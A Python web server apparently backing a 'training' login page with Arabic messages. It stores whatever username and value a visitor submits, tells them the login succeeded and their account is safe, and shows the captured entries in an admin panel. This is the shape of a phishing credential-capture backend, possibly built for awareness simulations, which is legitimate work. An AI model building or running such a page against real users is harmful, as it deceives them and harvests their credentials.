import sys
sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))

from database import connect, initialize
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from urllib.parse import urlparse
import json, secrets, os, mimetypes

ROOT = Path(__file__).resolve().parent.parent
SESSIONS = set()
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")


class Server(BaseHTTPRequestHandler):

    def send_json(self, data, status=200, cookie=None):
        body = json.dumps(data, ensure_ascii=False).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.end_headers()
        self.wfile.write(body)

    def read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > 8192:
            raise ValueError("Request too large")
        return json.loads(self.rfile.read(length))

    def authorized(self):
        cookie = self.headers.get("Cookie", "")
        token = cookie.replace("admin_session=", "").split(";")[0]
        return token in SESSIONS

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/api/admin/records":
            if not self.authorized():
                return self.send_json({"message": "غير مصرح"}, 401)

            with connect() as db:
                rows = db.execute(
                    "SELECT * FROM training_users ORDER BY id DESC"
                ).fetchall()

            records = [dict(row) for row in rows]
            return self.send_json({"records": records})

        if path == "/":
            target = ROOT / "frontend" / "index.html"
        elif path == "/admin/" or path == "/admin":
            target = ROOT / "admin" / "index.html"
        elif path.startswith("/static/"):
            name = path[len("/static/"):]
            if "/" in name or ".." in name:
                return self.send_error(404)
            target = ROOT / "frontend" / name
        elif path.startswith("/admin-assets/"):
            name = path[len("/admin-assets/"):]
            if "/" in name or ".." in name:
                return self.send_error(404)
            target = ROOT / "admin" / name
        else:
            return self.send_error(404)

        if not target.is_file():
            return self.send_error(404)

        data = target.read_bytes()
        self.send_response(200)
        self.send_header(
            "Content-Type",
            mimetypes.guess_type(str(target))[0] or "application/octet-stream"
        )
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        path = urlparse(self.path).path

        try:
            data = self.read_json()
        except Exception:
            return self.send_json({"message": "طلب غير صالح"}, 400)

        if path == "/api/demo-records":
            username = str(data.get("username", "")).strip()
            value = str(data.get("demo_value", ""))

            if not username or not value:
                return self.send_json({"message": "الحقول مطلوبة"}, 400)

            with connect() as db:
                db.execute(
                    "INSERT INTO training_users(username,demo_value) VALUES (?,?)",
                    (username, value)
                )

            return self.send_json({"message": "تم تسجيل الدخول بنجاح،  حسابك آمن"})

        if path == "/api/admin/login":
            if not ADMIN_PASSWORD:
                return self.send_json({"message": "إعداد كلمة مرور الإدارة مطلوب"}, 503)

            if secrets.compare_digest(
                str(data.get("password", "")), ADMIN_PASSWORD
            ):
                token = secrets.token_urlsafe(32)
                SESSIONS.add(token)
                return self.send_json(
                    {"message": "تم الدخول"},
                    cookie=f"admin_session={token}; HttpOnly; SameSite=Strict; Path=/"
                )

            return self.send_json({"message": "بيانات الإدارة غير صحيحة"}, 401)

        return self.send_json({"message": "Not Found"}, 404)

    def do_DELETE(self):
        path = urlparse(self.path).path

        if not self.authorized():
            return self.send_json({"message": "غير مصرح"}, 401)

        prefix = "/api/admin/records/"
        if not path.startswith(prefix):
            return self.send_error(404)

        record_id = path[len(prefix):]
        if not record_id.isdigit():
            return self.send_error(400)

        with connect() as db:
            cursor = db.execute(
                "DELETE FROM training_users WHERE id=?",
                (int(record_id),)
            )

        if cursor.rowcount == 0:
            return self.send_json({"message": "السجل غير موجود"}, 404)

        self.send_json({"message": "تم الحذف"})


initialize()

PORT = int(os.environ.get("PORT", 10000))

print(f"Server running on port: {PORT}")

HTTPServer(("0.0.0.0", PORT), Server).serve_forever()

